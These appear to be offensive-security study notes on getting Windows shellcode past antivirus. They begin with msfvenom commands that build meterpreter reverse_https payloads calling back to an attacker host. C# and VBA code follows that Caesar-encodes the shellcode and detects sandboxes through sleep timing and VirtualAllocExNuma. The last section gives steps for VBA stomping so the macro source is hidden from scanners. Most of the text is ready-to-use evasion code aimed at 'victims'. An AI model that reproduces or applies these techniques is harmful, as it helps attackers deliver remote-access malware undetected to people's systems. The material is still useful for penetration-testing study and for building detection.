## C#

### Using Caesar Substitution
1. `msfvenom -p windows/x64/meterpreter/reverse_https LHOST=<kali ip> LPORT=<port> EXITFUNC=thread -f csharp`
2. In Visual Studio, new Console App, paste this code in Main(). Make sure the namespace title is same as the title of the project:
```
<output from 1>
    
byte[] encoded = new byte[buf.Length];
for(int i = 0; i < buf.Length; i++)
{
    encoded[i] = (byte)(((uint)buf[i] + 2) & 0xFF);
}

StringBuilder hex = new StringBuilder(encoded.Length * 2);
foreach(byte b in encoded)
{
    hex.AppendFormat("0x{0:x2}, ", b);
}

Console.WriteLine("The payload is: " + hex.ToString());
```
3. Make sure the dropdowns on the left of 'Start' at the top bar is set to 'Release' and 'x64' (or other depending on victim OS)
4. Click Build -> Build Solution
5. Find the .exe in `<project folder>/bin/x64/Release` and run it in command line. The bytes should be printed out.
6. Replace your old payload with this new encoded payload
7. Below the payload, add this code to be able to decode the payload:
```
for(int i = 0; i < buf.Length; i++)
{
    buf[i] = (byte)(((uint)buf[i] - 2) & 0xFF);
}
```
8. Remember to rebuild your solution to update your c# exe

### Add a sleep timer
Heuristic tests often timeskip past any time.sleep commands. So we use time.now before and after time.sleep(2), and if 2 seconds haven't actually passed, it means we are in a heuristic test and avoid running anything dangerous to get detected.

Add these to the start of your C# code:
```
...
[DllImport("kernel32.dll")]
static extern void Sleep(uint dwMilliseconds);
        
static void Main(string[] args)
{
    DateTime t1 = DateTime.Now;
    Sleep(2000);
    double t2 = DateTime.Now.Subtract(t1).TotalSeconds;
    if(t2 < 1.5)
    {
        return;
    }
...
```

### Use non-emulated APIs
Some lesser known Win32 APIs are not emulated in heuristic tests, eg VirtualAllocExNuma. We use those APIs, and if the functions don't work, we know we are in a heuristic test.

Add these to the start of your C# code:
```
[DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
static extern IntPtr VirtualAllocExNuma(IntPtr hProcess, IntPtr lpAddress, 
uint dwSize, UInt32 flAllocationType, UInt32 flProtect, UInt32 nndPreferred);

[DllImport("kernel32.dll")]
static extern IntPtr GetCurrentProcess();

IntPtr mem = VirtualAllocExNuma(GetCurrentProcess(), IntPtr.Zero, 0x1000, 0x3000, 0x4, 0);
if(mem == null)
{
    return;
}
```

## VBA

### Caesar
1. `msfvenom -p windows/x64/meterpreter/reverse_https LHOST=<kali ip> LPORT=<port> EXITFUNC=thread -f csharp`
2. In Visual Studio, new Console App, paste this code in Main(). Make sure the namespace title is same as the title of the project:
```
<output from 1>
    
byte[] encoded = new byte[buf.Length];
for(int i = 0; i < buf.Length; i++)
{
    encoded[i] = (byte)(((uint)buf[i] + 2) & 0xFF);
}

uint counter = 0;

StringBuilder hex = new StringBuilder(encoded.Length * 2);
foreach(byte b in encoded)
{
    hex.AppendFormat("{0:D}, ", b);
    counter++;
    if(counter % 50 == 0)
    {
        hex.AppendFormat("_{0}", Environment.NewLine);
    }
}

Console.WriteLine("The payload is: " + hex.ToString());
```
3. Make sure the dropdowns on the left of 'Start' at the top bar is set to 'Release' and 'x64' (or other depending on victim OS)
4. Click Build -> Build Solution
5. Find the .exe in `<project folder>/bin/x64/Release` and run it in command line. The bytes should be printed out.
6. Replace your old payload with this new encoded payload
7. Below the payload, add this code to be able to decode the payload:
```
For i = 0 To UBound(buf)
    buf(i) = buf(i) - 2
Next i
```

### Sleep timer
Sleep timer for VBA. More info refer [here](#add-a-sleep-timer).
```
Private Declare PtrSafe Function Sleep Lib "KERNEL32" (ByVal mili As Long) As Long
...
Dim t1 As Date
Dim t2 As Date
Dim time As Long

t1 = Now()
Sleep (2000)
t2 = Now()
time = DateDiff("s", t1, t2)

If time < 2 Then
    Exit Function
End If
...
```


### Stomping
There is a cached version of VBA code in documents known as P-code. Its specific to the Microsoft product version so this method will only work for victims with the same version of the Microsoft product. You can evade AV by manually removing the actual VBA source code and relying entirely on the P-code to execute your shell.

0. First have your VBA shellcode ready (the whole VBA code, including whatever else obfuscations you want)
1. Use [FlexHex](https://www.heaventools.com/download-hex-editor.htm)
2. File > Open > OLE Compound File...
3. In navigation panel (bottom left), go to Macros > VBA > NewMacros
4. Scroll down (near the bottom) until you see "Attribute_VBName="NewMacros"
5. Select the bytes starting from there until the end
6. Edit > Insert Zero Block and accept everything

